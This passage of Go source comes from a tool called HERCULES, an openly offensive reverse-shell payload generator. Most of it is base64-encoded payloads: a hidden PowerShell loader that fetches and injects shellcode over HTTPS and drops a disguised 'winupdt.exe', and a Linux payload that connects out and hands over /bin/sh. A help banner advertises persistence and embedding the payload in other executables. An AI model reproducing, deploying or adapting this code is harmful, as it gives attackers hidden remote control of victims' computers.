hcImArRW5jb2RlZENvbXByZXNzZWRCdWZmZXIrYFwiKSkpKSwgW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSwgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkpLlJlYWRUb0VuZCgpOyIpIGVsc2UgKCVXaW5EaXIlXHN5c3dvdzY0XHdpbmRvd3Nwb3dlcnNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kICJJbnZva2UtRXhwcmVzc2lvbiAkKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyICgkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSAoLCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFwiYCtFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcitgXCIpKSkpLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IikKCmAKCiAgcmV0dXJuIFNoZWxsX1RlbXBsYXRlOwoKfQoKCmZ1bmMgUkVWRVJTRV9IVFRQU19TSEVMTChJUF9QT1JUIHN0cmluZykgKHN0cmluZykgey8vbCwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlKGJhc2U2NFRleHQsIFtdYnl0ZShtZXNzYWdlKSkKICAKCgpQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMsIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhgSkhFZ1BTQkFJZzBLVzBSc2JFbHRjRzl5ZENnaWEyVnlibVZzTXpJdVpHeHNJaWxkSUhCMVlteHBZeUJ6ZEdGMGFXTWdaWGgwWlhKdQpJRWx1ZEZCMGNpQldhWEowZFdGc1FXeHNiMk1vU1c1MFVIUnlJR3h3UVdSa2NtVnpjeXdnZFdsdWRDQmtkMU5wZW1Vc0lIVnBiblFnClpteEJiR3h2WTJGMGFXOXVWSGx3WlN3Z2RXbHVkQ0JtYkZCeWIzUmxZM1FwT3cwS1cwUnNiRWx0Y0c5eWRDZ2lhMlZ5Ym1Wc016SXUKWkd4c0lpbGRJSEIxWW14cFl5QnpkR0YwYVdNZ1pYaDBaWEp1SUVsdWRGQjBjaUJEY21WaGRHVlVhSEpsWVdRb1NXNTBVSFJ5SUd4dwpWR2h5WldGa1FYUjBjbWxpZFhSbGN5d2dkV2x1ZENCa2QxTjBZV05yVTJsNlpTd2dTVzUwVUhSeUlHeHdVM1JoY25SQlpHUnlaWE56CkxDQkpiblJRZEhJZ2JIQlFZWEpoYldWMFpYSXNJSFZwYm5RZ1pIZERjbVZoZEdsdmJrWnNZV2R6TENCSmJuUlFkSElnYkhCVWFISmwKWVdSSlpDazdEUW9pUUEwS2RISjVleVJrSUQwZ0lrRkNRMFJGUmtkSVNVcExURTFPVDFCUlVsTlVWVlpYV0ZsYVlXSmpaR1ZtWjJocAphbXRzYlc1dmNIRnljM1IxZG5kNGVYb3dNVEl6TkRVMk56ZzVJaTVVYjBOb1lYSkJjbkpoZVNncERRcG1kVzVqZEdsdmJpQmpLQ1IyCktYc2djbVYwZFhKdUlDZ29XMmx1ZEZ0ZFhTQWtkaTVVYjBOb1lYSkJjbkpoZVNncElId2dUV1ZoYzNWeVpTMVBZbXBsWTNRZ0xWTjEKYlNrdVUzVnRJQ1VnTUhneE1EQWdMV1Z4SURreUtYME5DbVoxYm1OMGFXOXVJSFFnZXlSbUlEMGdJaUk3TVM0dU0zeG1iM0psWVdObwpMVzlpYW1WamRIc2taaXM5SUNSa1d5aG5aWFF0Y21GdVpHOXRJQzF0WVhocGJYVnRJQ1JrTGt4bGJtZDBhQ2xkZlR0eVpYUjFjbTRnCkpHWTdmUTBLWm5WdVkzUnBiMjRnWlNCN0lIQnliMk5sYzNNZ2UxdGhjbkpoZVYwa2VDQTlJQ1I0SUNzZ0pGOTlPeUJsYm1RZ2V5UjQKSUh3Z2MyOXlkQzF2WW1wbFkzUWdleWh1WlhjdGIySnFaV04wSUZKaGJtUnZiU2t1Ym1WNGRDZ3BmWDE5RFFwbWRXNWpkR2x2YmlCbgpleUJtYjNJZ0tDUnBQVEE3SkdrZ0xXeDBJRFkwT3lScEt5c3BleVJvSUQwZ2REc2theUE5SUNSa0lId2daVHNnSUdadmNtVmhZMmdnCktDUnNJR2x1SUNScktYc2tjeUE5SUNSb0lDc2dKR3c3SUdsbUlDaGpLQ1J6S1NrZ2V5QnlaWFIxY200Z0pITWdmWDE5Y21WMGRYSnUKSUNJNWRsaFZJanQ5RFFwYlRtVjBMbE5sY25acFkyVlFiMmx1ZEUxaGJtRm5aWEpkT2pwVFpYSjJaWEpEWlhKMGFXWnBZMkYwWlZaaApiR2xrWVhScGIyNURZV3hzWW1GamF5QTlJSHNrZEhKMVpYMDdKRzBnUFNCT1pYY3RUMkpxWldOMElGTjVjM1JsYlM1T1pYUXVWMlZpClEyeHBaVzUwT3cwS0pHMHVTR1ZoWkdWeWN5NUJaR1FvSW5WelpYSXRZV2RsYm5RaUxDQWlUVzk2YVd4c1lTODBMakFnS0dOdmJYQmgKZEdsaWJHVTdJRTFUU1VVZ05pNHhPeUJYYVc1a2IzZHpJRTVVS1NJcE95UnVJRDBnWnpzZ1cwSjVkR1ZiWFYwZ0pIQWdQU0FrYlM1RQpiM2R1Ykc5aFpFUmhkR0VvSW1oMGRIQnpPaTh2WUN0emRISnBibWNvU1ZCZlVFOVNWQ2tyWUM4a2JpSWdLUTBLSkc4Z1BTQkJaR1F0ClZIbHdaU0F0YldWdFltVnlSR1ZtYVc1cGRHbHZiaUFrY1NBdFRtRnRaU0FpVjJsdU16SWlJQzF1WVcxbGMzQmhZMlVnVjJsdU16SkcKZFc1amRHbHZibk1nTFhCaGMzTjBhSEoxRFFva2VEMGtiem82Vm1seWRIVmhiRUZzYkc5aktEQXNKSEF1VEdWdVozUm9MREI0TXpBdwpNQ3d3ZURRd0tUdGJVM2x6ZEdWdExsSjFiblJwYldVdVNXNTBaWEp2Y0ZObGNuWnBZMlZ6TGsxaGNuTm9ZV3hkT2pwRGIzQjVLQ1J3CkxDQXdMQ0JiU1c1MFVIUnlYU2drZUM1VWIwbHVkRE15S0NrcExDQWtjQzVNWlc1bmRHZ3BEUW9rYnpvNlEzSmxZWFJsVkdoeVpXRmsKS0RBc01Dd2tlQ3d3TERBc01Da2dmQ0J2ZFhRdGJuVnNiRHNnVTNSaGNuUXRVMnhsWlhBZ0xWTmxZMjl1WkNBNE5qUXdNSDFqWVhSagphSHQ5YCkKCiAgSW5kZXggOj0gc3RyaW5ncy5SZXBsYWNlKHN0cmluZyhQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMpLCAiK3N0cmluZyhJUF9QT1JUKSsiLCBJUF9QT1JULCAtMSkKCgogIHJldHVybiBzdHJpbmcoSW5kZXgpCgp9CgoKCmZ1bmMgRElTUEFUQ0goKSB7CiAgdmFyIEVuY29kZWRCaW5hcnkgc3RyaW5nID0gIi8vSU5TRVJULUJJTkFSWS1IRVJFLy8iCgoKICBCaW5hcnksIF8gOj0gb3MuQ3JlYXRlKCJ3aW51cGR0LmV4ZSIpCgogIERlY29kZWRCaW5hcnksIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhFbmNvZGVkQmluYXJ5KQoKICBCaW5hcnkuV3JpdGVTdHJpbmcoc3RyaW5nKERlY29kZWRCaW5hcnkpKTsKCiAgQmluYXJ5LkNsb3NlKCkKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJ3aW51cGR0LmV4ZSIpOwogIEV4ZWMuU3RhcnQoKTsKfQ==`
var LINUX_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyhkaXIpICsgIiDCoz4gIiArIHN0cmluZyh2ZXJzaW9uKSArICIgwqM+ICIpOyAgIAogICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpCiAgICBjbWQ6PWV4ZWMuQ29tbWFuZCgiL2Jpbi9zaCIpOwogICAgY21kLlN0ZGluPWNvbm5lY3Q7CiAgICBjbWQuU3Rkb3V0PWNvbm5lY3Q7CiAgICBjbWQuU3RkZXJyPWNvbm5lY3Q7CiAgICBjbWQuUnVuKCk7Cn0=`



var HELP string = `

                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   

############################ HERCULES REVERSE SHELL ############################



Usage : ./HERCULES <Local Ip> <Local Port> <options>


Options : 

      -p                 Payload to use. ( Windows / Linux )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )

      --persistence      Enable outo persistence option for continious acces.

      --embed="file.exe" Embed the selected payload with selected exe file.


`



func CheckGolang() {
  if runtime.GOOS == "linux" {
    Result,_ := exec.Command("sh", "-c", "go version").Output()

    if !(strings.Contains(string(Result), "version")){
      exec.Command("sh", "-c", `zenity --info --text="Installing golang...!" --title="Setup!"`).Run()
      exec.Command("sh", "-c", `apt-get install golang`).Run()
    }

    if !(strings.Contains(string(Result), "go1.6.1")){
      exec.Command("sh", "-c", `zenity --error --text="Old golang version detected !" --title="Warning !"`).Run()
      exec.Command("sh", "-c", `zenity --info --text="Updating golang..." --title="Info !"`).Run()
      exec.Command("sh", "-c", `apt-get install golang`).Run()
    }

  }else if runtime.GOOS == "windows"{
    Result,_ := exec.Command("cmd", "/C", "go version").Output()

    if !(strings.Contains(string(Result), "version")){
      exec.Command("cmd", "/C", `msg * Please install golang first !`).Run()
      os.Exit(1)
    }


    if !(strings.Contains(string(Result), "go1.6.1")){
      exec.Command("cmd", "/C", `msg * Old golang version detected !`).Run()
      os.Exit(1)
    }
  }
}
